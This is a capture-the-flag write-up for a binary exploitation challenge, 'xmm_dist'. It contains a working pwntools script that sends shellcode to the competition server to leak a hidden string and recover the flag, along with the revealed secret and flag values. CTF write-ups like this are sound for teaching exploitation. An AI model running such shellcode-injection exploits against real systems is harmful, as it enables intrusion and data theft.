# xmm_dist

The challenge is to find what "XXXXXXXXXXXXXX" is on remote for the check,

`j_strcmp_ifunc("XXXXXXXXXXXXX", buf) == 0;`

If everything goes to hell, I could try out an **strcmp timing attack**. More realistically, there's 13 characters in there, and that's probably not getting bruteforced anytime soon.

After that, there's this::
```c
v5 = mmap64(0LL, 0x1000uLL, 7uLL, 0x22u, 0xFFFFFFFFuLL, 0LL);
v5();
```

Quoting myself during the CTF:

> this is like
> `mmap(addr=0, length=0x1000, prot=rwx, flags=MAP_ANON|MAP_PRIVATE, fd=-1, offset=0)`
> this is just shellcode execution... wow for real?

Apparently it was. The challenge description says to not launch a shell, and if you do that, you'll realise that the `xmm` binary is actually _execute-only_ on remote. So instead of doing that, the goal here is to read the flag from the binary internally, which I did by obtaining the correct value for "XXXXXXXXXXXXXXX":

```python
from pwn import *
context.binary = 'xmm_dist'
r = remote('chals.ctf.sg', 20401)
r.recvrepeat(timeout=1)
r.send(b'my <removed>')
shellcode = asm(shellcraft.write(1, 0x49501d, 13))
r.sendafter('brain: ', shellcode)
print(flag := r.recvall())

r = remote('chals.ctf.sg', 20401)
r.recvrepeat(timeout=1)
r.sendline(flag)
print(r.recvall())
```
That's it.
```python
[+] Opening connection to chals.ctf.sg on port 20401: Done
[+] Receiving all data: Done (13B)
[*] Closed connection to chals.ctf.sg port 20401
b'm0nster_curr7'
[+] Opening connection to chals.ctf.sg on port 20401: Done
[+] Receiving all data: Done (341B)
[*] Closed connection to chals.ctf.sg port 20401
b'\xe2\x94\x83 \xe2\x94\x83 <3                      \xe2\x94\x83 \xe2\x94\x83\n\xe2\x94\x83 \xe2\x94\x83 CTFSG{xmm_hunter_1337}  \xe2\x94\x83 \
...'
```
